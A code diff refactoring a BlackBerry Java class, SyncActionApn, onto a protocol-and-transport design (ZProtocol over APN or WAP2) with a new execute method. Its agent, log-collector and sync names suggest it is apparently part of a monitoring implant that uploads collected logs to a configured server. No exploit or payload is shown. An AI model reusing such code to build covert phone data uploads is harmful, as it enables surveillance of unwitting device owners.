@@ -7,45 +7,41 @@ import java.util.Vector;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.AgentManager;
 import blackberry.action.Apn;
+import blackberry.action.SyncAction;
 import blackberry.action.SyncActionInternet;
+import blackberry.action.sync.protocol.ZProtocol;
+import blackberry.action.sync.transport.ApnTransport;
+import blackberry.action.sync.transport.Wap2Transport;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.event.Event;
 import blackberry.log.LogCollector;
 import blackberry.transfer.Transfer;
 import blackberry.utils.Check;
 import blackberry.utils.WChar;
 
-public class SyncActionApn extends SyncActionInternet {
+public class SyncActionApn extends SyncAction {
     //#ifdef DEBUG
     private static Debug debug = new Debug("SyncActionApn", DebugLevel.VERBOSE);
     //#endif
 
     String host;
+    int port = 80;
 
     public SyncActionApn(final int actionId_, final byte[] confParams) {
         super(actionId_);
-
-        apns = new Vector();
         parse(confParams);
+
+        protocol = new ZProtocol();
 
         //#ifdef DBC
         Check.requires(actionId == ACTION_SYNC_APN, "Wrong ActionId");
         //#endif
-
-        logCollector = LogCollector.getInstance();
-        agentManager = AgentManager.getInstance();
-        transfer = Transfer.getInstance();
-
-        wifi = false;
-        gprs = false;
-
-    }
-
-    protected SyncActionApn(final int actionId) {
-        super(actionId);
     }
 
     protected boolean parse(final byte[] confParams) {
+
+        Vector apns = null;
 
         //#ifdef DBC
         Check.requires(apns != null, "parse: apns null");
@@ -66,6 +62,7 @@ public class SyncActionApn extends SyncActionInternet {
             //#endif
 
             final int entries = databuffer.readInt(); // readByte();
+
             int len;
             byte[] stringRaw;
 
@@ -99,6 +96,12 @@ public class SyncActionApn extends SyncActionInternet {
             Check.ensures(apns.size() == entries, "parse apns entries");
             //#endif
 
+            if (entries == 0) {
+                transport = new Wap2Transport(host, port);
+            } else {
+                transport = new ApnTransport(host, port, apns);
+            }
+
         } catch (final EOFException e) {
             //#ifdef DEBUG
             debug.error("params FAILED");
@@ -108,20 +111,35 @@ public class SyncActionApn extends SyncActionInternet {
         return true;
     }
 
-    protected void transferInit() {
-        transfer.initApn(host, port, ssl, wifiForced, wifi, gprs, apns);
+    public String toString() {
+        return "SyncApn " + transport;
     }
 
-    public String toString() {
-        final StringBuffer sb = new StringBuffer();
-        sb.append("SyncApn " + host + " ( ");
+    public boolean execute(Event event) {
 
-        for (int i = 0; i < apns.size(); i++) {
-            final Apn apn = (Apn) apns.elementAt(i);
-            sb.append(apn);
-            sb.append(" ");
+        //#ifdef DBC
+        Check.requires(protocol != null, "execute: null protocol");
+        Check.requires(transport != null, "execute: null transport");
+        //#endif
+        
+        if (transport.isAvailable()) {
+            //#ifdef DEBUG
+            debug.trace("execute: transport available");
+            //#endif
+            protocol.init(transport);
+            boolean ret = protocol.start();
+            
+            //#ifdef DEBUG
+            debug.trace("execute protocol: " + ret);
+            //#endif
+            
+            return ret;
+        }else{
+            //#ifdef DEBUG
+            debug.trace("execute: transport not available");
+            //#endif
         }
-        sb.append(" )");
-        return sb.toString();
+        
+        return false;
     }
 }
